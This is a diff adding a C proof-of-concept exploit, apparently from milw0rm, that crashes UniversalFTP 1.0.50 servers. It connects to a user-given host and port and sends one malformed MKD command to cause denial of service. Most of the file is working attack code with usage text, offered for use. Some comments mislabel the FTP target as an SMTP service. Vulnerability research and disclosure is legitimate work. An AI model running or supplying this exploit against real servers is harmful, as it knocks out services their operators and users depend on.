@@ -1,0 +1,135 @@
+/*
+=============================================================
+DoS Exploit for UniversalFTP version 1.0.50
+=============================================================
+UniversalFTP (www.teamtek.net)
+http://www.5e5.net/cgi-bin/download3.asp
+Suffers from several unhandled user input vulnerabilities that
+cause the program to crash.
+
+I originally found this vulnerability on October 27th  and wrote
+this but got caught up working with the Renasoft PSS Exploit
+and forgot to report it.
+
+The vulnerability was posted to secunia by Parvez Anwar November
+13th - good job and thanks to him :).
+
+
+
+*/
+
+
+
+#include <stdio.h>
+#include <string.h>
+#include <windows.h>
+#include <winsock.h>
+
+#define BUFF_SIZE 1024
+
+#pragma comment(lib,"wsock32.lib")
+
+int main(int argc, char *argv[])
+{
+WSADATA wsaData;
+char buffer[BUFF_SIZE];
+
+struct hostent *hp;
+struct sockaddr_in sockin;
+char buf[300], *check, *cmd;
+int sockfd, bytes;
+int i;
+char *hostname;
+unsigned short port;
+
+if (argc <= 1)
+  {
+         printf("\n==================================================================\n");
+         printf("UniversalFTP v1.0.50 Denial Of Service PoC Code\n");
+         printf("Discovered By: Parvez Anwar and Greg Linares (glinares.code
+[at ] gmail [dot] com)\n");
+         printf("Original Reported By: Parvez Anwar\n");
+     printf("Usage: %s [hostname] [port]\n", argv[0]);
+     printf("default port is 21 \n");
+         printf("====================================================================\n");
+     exit(0);
+  }
+
+cmd = argv[3];
+hostname = argv[1];
+if (argv[2]) port = atoi(argv[2]);
+else port = atoi("21");
+
+if (WSAStartup(MAKEWORD(1, 1), &wsaData) < 0)
+  {
+     fprintf(stderr, "Error setting up with WinSock v1.1\n");
+     exit(-1);
+  }
+
+
+  hp = gethostbyname(hostname);
+  if (hp == NULL)
+  {
+     printf("ERROR: Uknown host %s\n", hostname);
+         printf("%s",hostname);
+     exit(-1);
+  }
+
+  sockin.sin_family = hp->h_addrtype;
+  sockin.sin_port = htons(port);
+  sockin.sin_addr = *((struct in_addr *)hp->h_addr);
+
+  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)
+  {
+     printf("ERROR: Socket Error\n");
+     exit(-1);
+  }
+
+  if ((connect(sockfd, (struct sockaddr *) &sockin,
+               sizeof(sockin))) == SOCKET_ERROR)
+  {
+     printf("ERROR: Connect Error\n");
+     closesocket(sockfd);
+     WSACleanup();
+     exit(-1);
+  }
+
+  printf("Connected to [%s] on port [%d], sending exploit....\n",
+         hostname, port);
+
+
+  if ((bytes = recv(sockfd, buf, 300, 0)) == SOCKET_ERROR)
+  {
+     printf("ERROR: Recv Error\n");
+     closesocket(sockfd);
+     WSACleanup();
+     exit(1);
+  }
+
+  // wait for SMTP service welcome
+
+  buf[bytes] = '\0';
+  check = strstr(buf, "2");
+  if (check == NULL)
+  {
+     printf("ERROR: NO  response from SMTP service\n");
+     closesocket(sockfd);
+     WSACleanup();
+     exit(-1);
+  }
+  printf("%s\n", buf);
+
+
+
+  char Exploit[] = "MKD \\..\\******\\|\\******";
+
+
+  send(sockfd, Exploit, strlen(Exploit),0);
+  Sleep(1000);
+  printf("[*] FTP DoS Packet Sent\n");
+
+  closesocket(sockfd);
+  WSACleanup();
+}
+
+// milw0rm.com [2006-11-15]
